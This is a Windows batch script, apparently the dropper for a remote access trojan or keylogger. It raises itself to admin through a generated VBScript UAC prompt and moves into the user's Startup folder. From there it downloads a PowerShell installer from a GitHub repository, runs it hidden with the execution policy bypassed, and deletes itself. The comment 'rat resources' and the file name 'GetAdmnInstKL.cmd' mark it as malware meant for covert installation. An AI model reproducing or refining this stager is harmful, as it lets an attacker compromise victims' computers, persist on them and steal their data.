@echo off
REM get admin permissions for script
REM created by: jfrdgh (@bigmanlc on dc)

:: BatchGotAdmin
:-------------------------------------
REM --> check for permissions
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> if error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else (
    goto gotAdmin
)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

REM cd to startup
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cd %STARTUP%

REM rat resources
powershell -ExecutionPolicy Bypass -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE-/main/files/installer.ps1' -OutFile installer.ps1"

@REM Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File installer.ps1" -WindowStyle Hidden
@REM powershell -ExecutionPolicy Bypass -File installer.ps1 -windowstyle hidden
powershell powershell.exe -windowstyle hidden -ep bypass ./installer.ps1

@REM self delete
del GetAdmnInstKL.cmd
